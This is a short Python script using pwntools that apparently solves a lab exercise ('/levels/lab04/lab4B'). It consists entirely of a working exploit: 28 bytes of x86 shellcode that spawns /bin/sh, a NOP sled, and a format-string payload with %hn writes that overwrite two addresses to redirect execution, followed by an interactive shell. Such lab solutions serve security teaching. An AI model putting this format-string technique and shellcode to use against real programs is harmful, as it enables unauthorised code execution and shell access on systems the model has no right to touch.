from pwn import *

shellcode = "\x31\xC0\x83\xEC\x04\x89\x04\x24\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80"
# 28 bytes

r = process(["/tmp/transcen/r.sh", "/levels/lab04/lab4B"])
r.sendline(p32(0x80498ae) + p32(0x080498ac) + "\x90" * 35 + shellcode + "%49080x" + "%6$hn" + "%13938x" + "%7$hn")

r.interactive()
